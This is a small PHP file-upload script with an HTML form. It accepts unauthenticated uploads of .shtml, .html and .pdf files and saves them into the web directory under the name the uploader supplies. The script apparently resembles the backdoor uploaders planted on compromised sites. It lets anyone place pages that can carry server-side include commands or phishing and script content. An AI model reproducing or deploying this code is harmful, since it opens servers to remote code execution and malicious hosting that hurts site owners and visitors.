<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['Filedata1'])) {
    $f = $_FILES['Filedata1'];
    $ext = strtolower(pathinfo($f['name'], PATHINFO_EXTENSION));
    if (in_array($ext, ['shtml', 'html', 'pdf'])) {
        @mkdir('./', 0755, true);
        if (move_uploaded_file($f['tmp_name'], $f['name'])) {
            $u = urlencode($f['name']);
            echo "Uploaded! <a href=\"$u\">$u</a>";
        } else echo "Move failed.";
    } else echo "Only .shtml, .html, .pdf allowed!";
} ?>
<form method="POST" enctype="multipart/form-data">
<input type="file" name="Filedata1" required><br><br>
<button>Upload</button></form>